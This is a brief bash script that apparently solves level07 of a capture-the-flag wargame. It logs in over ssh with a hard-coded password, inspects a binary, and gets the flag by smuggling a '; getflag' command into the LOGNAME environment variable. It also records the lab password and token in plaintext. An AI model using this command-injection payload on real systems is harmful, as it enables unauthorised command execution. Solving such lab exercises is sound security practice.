#!/bin/bash

ssh() {
    sshpass -p 'wiok45aaoguiboiki2tuin6ub' ssh level07@localhost -p 2220 "$1"  
}

# token fiumuikeil55xe9cu4dood66h

ssh "ls -la"

ssh "getfacl level07"

ssh "strings level07"

ssh "ltrace ./level07"

ssh 'echo $LOGNAME'

ssh 'export LOGNAME="; getflag"; ./level07'

# Check flag.Here is your token : fiumuikeil55xe9cu4dood66h